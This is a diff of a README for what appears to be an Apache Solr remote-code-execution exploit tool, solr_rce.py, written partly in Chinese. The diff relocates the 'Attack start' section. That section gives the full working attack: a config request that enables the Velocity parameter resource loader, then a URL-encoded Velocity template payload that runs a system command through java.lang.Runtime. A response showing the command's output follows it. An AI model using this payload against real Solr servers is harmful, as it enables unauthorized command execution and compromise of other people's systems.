@@ -2,56 +2,12 @@
 
 ## python usage:
 
-`python solr_rce.py http://192.168.5.86:8983 command`
+`python solr_rce.py http://x.x.x.x:8983 command`
 
 
 ![](./solr-rce.jpg)
 
-## Attack start
 
-
-1. Set `params.resource.loader.enabled` as true.
-
-```
-Request:
-========================================================================
-POST /solr/test/config HTTP/1.1
-Host: solr:8983
-Content-Type: application/json
-Content-Length: 259
-
-{
-  "update-queryresponsewriter": {
-    "startup": "lazy",
-    "name": "velocity",
-    "class": "solr.VelocityResponseWriter",
-    "template.base.dir": "",
-    "solr.resource.loader.enabled": "true",
-    "params.resource.loader.enabled": "true"
-  }
-}
-========================================================================
-```
-
-2. RCE via velocity template
-
-```
-Request:
-========================================================================
-GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
-Host: localhost:8983
-========================================================================
-
-
-Response:
-========================================================================
-HTTP/1.1 200 OK
-Content-Type: text/html;charset=utf-8
-Content-Length: 56
-
-     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)
-========================================================================
-```
 ## 0x01 solr简介
 
 Solr是Apache Lucene项目的开源企业搜索平台。
@@ -166,6 +122,52 @@ Content-Length: 149
 
 注意到 状态码是`400`，`而不是200`，出现`500`的情况可能是 异常报错。这可以作为后续编写`脚本`判断漏洞存在有辅助帮助。
 
+
+## Attack start
+
+
+1. Set `params.resource.loader.enabled` as true.
+
+```
+Request:
+========================================================================
+POST /solr/test/config HTTP/1.1
+Host: solr:8983
+Content-Type: application/json
+Content-Length: 259
+
+{
+  "update-queryresponsewriter": {
+    "startup": "lazy",
+    "name": "velocity",
+    "class": "solr.VelocityResponseWriter",
+    "template.base.dir": "",
+    "solr.resource.loader.enabled": "true",
+    "params.resource.loader.enabled": "true"
+  }
+}
+========================================================================
+```
+
+2. RCE via velocity template
+
+```
+Request:
+========================================================================
+GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1
+Host: localhost:8983
+========================================================================
+
+
+Response:
+========================================================================
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+Content-Length: 56
+
+     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)
+========================================================================
+```
 ## 参考链接：
 
 https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt
